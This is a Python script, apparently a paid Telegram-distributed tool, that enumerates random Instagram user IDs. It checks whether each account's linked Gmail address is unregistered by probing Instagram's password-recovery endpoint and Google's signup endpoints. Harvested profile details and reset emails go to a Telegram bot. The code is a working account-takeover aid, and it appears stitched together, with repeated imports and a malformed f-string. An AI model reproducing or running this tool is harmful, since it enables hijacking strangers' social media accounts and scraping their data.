import sys
import time
import requests
import webbrowser
import pyfiglet
from rich.console import Console
console = Console()
import sys
import time
from datetime import datetime, timedelta
from colorama import Fore, Style, init

# --- Python Version Check ---
version = f"{sys.version_info.major}.{sys.version_info.minor}"
if version == "3.11":
    console.print(f"🔹 Your Python version: [bold green]{version}[/bold green]")
    console.print("[bold green]✅ Compatible version! Loading script...[/bold green]")
    time.sleep(2)


    # --- Telegram Bot Redirect ---
    console.print("\n[bold green]Redirecting to Telegram bot now![/bold green]")
    try:
        webbrowser.open("https://t.me/GLITCH_ARMY")
    except Exception:
        console.print(f"[bold red]Please open this link manually: {https://t.me/GLITCH_ARMY}[/bold red]")
# Initialize Colorama
init(autoreset=True)

# Password Configuration
CORRECT_PASSWORD = "SF KI CHUTT"  # Change this to your desired password

# Fixed expiry time (set to specific date and time)
EXPIRE_TIME = '2035-10-02 13:35:56'  # yyyy-mm-dd HH:MM:SS format

EXPIRE_MSG = (
    f"\n{Fore.RED}{Style.BRIGHT}❌ This ID has expired.\n")

BANNER = f"""
{Fore.MAGENTA}{Style.BRIGHT}
           _____ ______   __________  _______    __
          / ___// ____/  /_  __/ __ \/  _/   |  / /
          \__ \/ /_       / / / /_/ // // /| | / /
         ___/ / __/      / / / _, _// // ___ |/ /___
        /____/_/        /_/ /_/ |_/___/_/  |_/_____/
{Style.RESET_ALL}
"""

def check_password():
    print(BANNER)
    print(f"{Fore.BLUE}{Style.BRIGHT}  🚀Welcome to  {Fore.YELLOW}SF TRIAL {Fore.YELLOW}⏳ {Fore.BLUE}Access Checker {Fore.BLUE}🚀\n")
    password = input(f"{Fore.WHITE}{Style.BRIGHT}  Enter SF Key: {Fore.WHITE}").strip()
    
    if password != CORRECT_PASSWORD:
        print(f"{Fore.RED}{Style.BRIGHT}❌ Your KEY 🔐 is Invalid!")
        sys.exit(1)
    
    return True

def check_expiration():
    current_time = datetime.now()
    expiration_time = datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S')

    if current_time > expiration_time:
        print(BANNER)
        print(f"{Fore.WHITE}{Style.BRIGHT}  Welcome to {Fore.CYAN}SF TRIAL {Fore.WHITE}▲ {Fore.RED}Access Checker {Fore.RED}❌\n")
        print(EXPIRE_MSG)
        sys.exit(1)
    else:
        # Calculate remaining time
        remaining = expiration_time - current_time
        days = remaining.days
        hours, rem = divmod(remaining.seconds, 3600)
        minutes, seconds = divmod(rem, 60)
        
        # Format expiry times
        expiry_24h = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
        expiry_12h = expiration_time.strftime("%I:%M %p")
        
        print(f"{Fore.GREEN}{Style.BRIGHT} ✅ Access Verified! Welcome 🚀")
        print(f"{Fore.CYAN}⏰Expiry (24h): {Fore.CYAN}{expiry_24h}")
        print(f"{Fore.CYAN}⏰Expiry (12h): {Fore.CYAN}{expiry_12h}")
        print(f"{Fore.YELLOW}🕛Remaining Access: {Fore.YELLOW}{days}d {hours}h {minutes}m {seconds}s")
        print(f"{Fore.WHITE}{Style.BRIGHT}  THIS SF {Fore.CYAN}FILE{Fore.WHITE}PERMANET {Fore.RED}BY {Fore.RED}GLITCH\n")
        time.sleep(1)
        print(f"\n{Fore.GREEN}🎉 Enjoy your Trail access! 💻   ")

# Main execution
if check_password():
    check_expiration()

import os
import time
import json
import uuid
import base64
import random
import hashlib
import inspect
import re
import webbrowser
from datetime import datetime
from threading import Thread
from random import choice as cc,randrange as rr
import requests
import pytz
from cfonts import render
from user_agent import generate_user_agent as ggb
from requests import post as pp,get
import Topython
import sys

COLOR_COMBOS=[['green','yellow'],['magenta','red'],['blue','cyan'],['white','gray'],['red','magenta'],['yellow','green']]
stein_colors,qe_colors=random.sample(COLOR_COMBOS,2)
STEIN=render('SHADDOW',colors=stein_colors,align='center',font='block',background='black')
QE=render('TELEGRAM ☞ @SHADDOW_FIGHTER05 | JOIN☞ @☞\n VERSION☞ V6.0🔱',colors=qe_colors,align='right',font='console',background='black')
print(STEIN)
print(QE)
time.sleep(1)

# Define ANSI escape codes for colors
YELLOW = "\033[93m"
RESET = "\033[0m"

import base64
import uuid
import platform
import hashlib
Token=input(f"{YELLOW}╰┈Bot Token : ")
import base64
import pytz
import requests
import sys
from datetime import datetime
import webbrowser
ID=input(f'{YELLOW}╰┈User ID: ')

print("\033[1m\n[🚀] Access verified. Welcome!\033[0m")
import base64
import pytz
import requests
import sys
from datetime import datetime
import webbrowser

os.system('cls' if os.name == 'nt' else 'clear')
total=0
hits=0
bad_gm=0
bad_mail=0
goodig=0
infoinsta={}

import requests
yy='azertyuiopmlkjhgfdsqwxcvbn'

def tll():
	try:
		n1=''.join(cc(yy)for i in range(rr(6,9)));n2=''.join(cc(yy)for i in range(rr(3,9)));host=''.join(cc(yy)for i in range(rr(15,30)));he3={'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','user-agent':str(ggb())};res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=he3);tok=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2);cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn','user-agent':ggb()};data={'f.req':f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data);tl=str(response.text).split('",null,"')[1].split('"')[0];host=response.cookies.get_dict()['__Host-GAPS']
		with open('tl.txt','w')as f:f.write(f"{tl}//{host}\n")
	except Exception as e:print(e);tll()
tll()

def check_gmail(email):
	global bad_mail,hits
	try:
		if'@'in email:email=str(email).split('@')[0]
		try:o=open('tl.txt','r').read().splitlines()[0]
		except:o=open('tl.txt','r').read().splitlines()[0]
		tl,host=o.split('//');cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",'user-agent':ggb()};params={'TL':tl};data=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";response=pp('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if'"gf.uar",1'in str(response.text):
			hits+=1;pppp()
			if'@'not in email:ok=email+'@gmail.com';username,gg=ok.split('@');InfoAcc(username,gg)
			else:username,gg=email.split('@');InfoAcc(username,gg)
		else:bad_mail+=1;pppp()
	except:''

def check(email):
	global goodig,bad_gm;ua=ggb();dev='android-';device_id=dev+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];uui=str(uuid.uuid4());headers={'User-Agent':ua,'Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':'9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','adid':uui,'guid':uui,'device_id':device_id,'query':email}),'ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
	if email in response:
		if'@gmail.com'in email:check_gmail(email)
		goodig+=1;pppp()
	else:bad_gm+=1;pppp()

def rest(user):
	try:headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB, en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding':'gzip, deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}','ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).json();r=response['email']
	except:r='bad'
	return r

def date(Id):
	try:
		uid=int(Id)
		if 1<uid<1279000:return 2010
		elif 1279001<=uid<17750000:return 2011
		elif 17750001<=uid<279760000:return 2012
		elif 279760001<=uid<900990000:return 2013
		elif 900990001<=uid<1629010000:return 2014
		elif 1900000000<=uid<2500000000:return 2015
		elif 2500000000<=uid<3713668786:return 2016
		elif 3713668786<=uid<5699785217:return 2017
		elif 5699785217<=uid<8507940634:return 2018
		elif 8507940634<=uid<21254029834:return 2019
		else:return'2020-2023'
	except Exception:return''

def InfoAcc(username,gg):
	global total;rr=infoinsta.get(username,{});Id=rr.get('pk',None);full_name=rr.get('full_name',None);fows=rr.get('follower_count',None);fowg=rr.get('following_count',None);pp=rr.get('media_count',None);isPraise=rr.get('is_private',None);bio=rr.get('biography',None);is_verified=rr.get('is_verified',None);bizz=rr.get('is_business',None)
	try:
		if fows and pp:
			if int(fows)>=10 and int(pp)>=2:meta=True
			else:meta=False
		else:meta=False
	except:meta=False
	total+=1;reset_email=rest(username)
	if reset_email.endswith('@gmail.com'):email=f"{username}@gmail.com"
	elif reset_email.endswith('@a**.com')or reset_email.endswith('@aol.com'):email=f"{username}@aol.com"
	else:email=f"{username}"
	ss=f"""
╔══✦❘༻💓༺❘✦══╗
😎 𝐓𝐄𝐀𝐌 𝐒𝐅 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐓𝐎𝐎𝐋 😎
╚══✦❘༻🤍༺❘✦══╝
👤 𝗡𝗔𝗠𝗘  ➟ ✦ {full_name}
🔥 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘    ➟ ✦ @{username}
📧 𝗘𝗠𝗔𝗜𝗟  ➟ ✦{email}
👑 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦  ➟ ✦ {fows}
𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚  ➟ ✦{fowg}
🎬 𝗣𝗢𝗦𝗧𝗦   ➟ ✦{pp}
💀 𝗕𝗜𝗢     ➟ ✦  {bio}
🔒 𝗣𝗥𝗜𝗩𝗔𝗧𝗘    ➟ ✦  {isPraise}
🆔 𝗜𝗗    ➟ ✦ {Id}
📆 𝗗𝗔𝗧𝗘  ➟ ✦ {date(Id)}
⚔️ 𝗠𝗘𝗧𝗔  ➟ ✦ {meta}
🌐 𝗨𝗥𝗟 ➟ ✦ https://www.instagram.com/{username}
♻️ 𝗥𝗘𝗦𝗘𝗧  ➟ ✦ {reset_email}

╔══✦❘༻🤍༺❘✦══╗
👑 𝗢𝗪𝗡𝗘𝗥   ➟ @shadowfighter05⚡@sf_army
💻 𝗠𝗔𝗗𝗘 𝗕𝗬 ➟ @RANVEERpy
╚══✦❘༻💓༺❘✦══╝

🔥💀 𝑰 𝑫𝑶𝑵'𝑻 𝑭𝑶𝑳𝑳𝑶𝑾 𝑻𝑯𝑬 𝑻𝑹𝑬𝑵𝑫 –
      𝑰 𝑨𝑴 𝑻𝑯𝑬 𝑻𝑹𝑬𝑵𝑫 👑⚡
""";inline_keyboard=[[{'text':'𝐀𝐃𝐌𝐈𝐍 🧑🏻‍💻💻','url':'https://t.me/shadowfighter05'},{'text':'𝐂𝐇𝐀𝐍𝐍𝐄𝐋 💓🤍','url':'https://t.me/GLITCH_ARMY'}]];payload={'chat_id':ID,'text':ss,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})}
	try:requests.post(f"https://api.telegram.org/bot{Token}/sendMessage",data=payload)
	except:pass

def pppp():
    try:
        os.system('cls' if os.name=='nt' else 'clear')
        
        # Color definitions
        GREEN = "\033[1;32m"
        RED = "\033[1;31m"
        YELLOW = "\033[1;33m"
        CYAN = "\033[1;36m"
        WHITE = "\033[1;37m"
        RESET = "\033[0m"
        
        print(""*54)
        print(f"{GREEN}𝑯𝑰𝑻𝑺:  [{hits}] {RESET}   {RED}𝑩𝑨𝑫: [{bad_gm}] {RESET}   {WHITE}𝑴𝑨𝑰𝑳: {bad_mail} {RESET} ")
        print(""*54)
        print(f"{CYAN}𝐒𝐅 𝐌𝐄𝐓𝐀 𝐏𝐀𝐈𝐃 𝐅𝐈𝐋𝐄🔱{RESET}".center(54))
    except Exception as e:
        print(f"Display error: {e}")

os.system('cls' if os.name=='nt' else 'clear')

import requests
import json
import random
import string
from threading import Thread

infoinsta = {}

def safe_int_input(prompt, default):
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

ranges = {
    1: (1279001, 17750000),
    2: (17750000, 279760000),
    3: (279760000, 900990000),
    4: (900990000, 1629010000),
    5: (1629010000, 2500000000),
    6: (2500000000, 3713668786),
    7: (3713668786, 5699785217),
    8: (5699785217, 8507940634),
    9: (8507940634, 21254029834)
}

# ANSI color codes
YELLOW = '\033[93m'
PINK = '\033[95m'
RED = '\033[91m'
BLUE = '\033[94m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RESET = '\033[0m'

print(f'{CYAN}🗓️ 𝐒𝐞𝐥𝐞𝐜𝐭 𝐚 𝐲𝐞𝐚𝐫 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐫𝐚𝐧𝐠𝐞 💓🤍{RESET}')

for k in range(1, 10):
    print(f"{YELLOW}{k}{RESET} - {YELLOW}{2010+k}{RESET}")

year_choice = safe_int_input(f'{YELLOW}🥂𝐄ɳƚҽɾ 𝐘συɾ 𝐘ҽαɾ ƈԋσιƈҽ (𝟏-𝟗): {RESET}', 5)

def generate_user_id():
    start,end=ranges.get(year_choice,ranges[5])
    return str(random.randrange(start,end))

def gg(min_followers,min_posts,user_id_func):
	while True:
		try:
			user_id=user_id_func();model_number=str(random.randint(150,999));android_version=random.choice(['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0']);dpi=str(random.randint(100,1300));resolution=f"{random.randint(200,2000)}x{random.randint(200,2000)}";brand=random.choice(['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME']);build_suffix=str(random.randint(111,999));user_agent=f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})";lsd_token=''.join(random.choices(string.ascii_letters+string.digits,k=32));headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/cristiano/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd_token};data={'lsd':lsd_token,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':json.dumps({'userID':user_id,'username':'cristiano'}),'server_timestamps':'true','doc_id':'7717269488336001'};response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);user_info=response.json().get('data',{}).get('user',{});username=user_info.get('username','');infoinsta[username]=user_info;follower_count=int(user_info.get('follower_count',0));media_count=int(user_info.get('media_count',0))
			if username and'_'not in username and follower_count>=min_followers and media_count>=min_posts:email=f"{username}@gmail.com";check(email)
		except:pass

minimum_followers = safe_int_input(f'{GREEN}🤍𝖊𝖓𝖙𝖊𝖗 𝖒𝖎𝖓𝖎𝖒𝖚𝖒 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 𝖓𝖊𝖊𝖉𝖊𝖉: {RESET}', 0)
minimum_posts = safe_int_input(f'{GREEN}💓 {GREEN}𝖊𝖓𝖙𝖊𝖗 𝖒𝖎𝖓𝖎𝖒𝖚𝖒 𝖓𝖚𝖒𝖇𝖊𝖗 𝖔𝖋 𝖕𝖔𝖘𝖙𝖘 𝖓𝖊𝖊𝖉𝖊𝖉: {RESET}', 0)

for _ in range(120):
    Thread(target=gg,args=(minimum_followers,minimum_posts,generate_user_id)).start()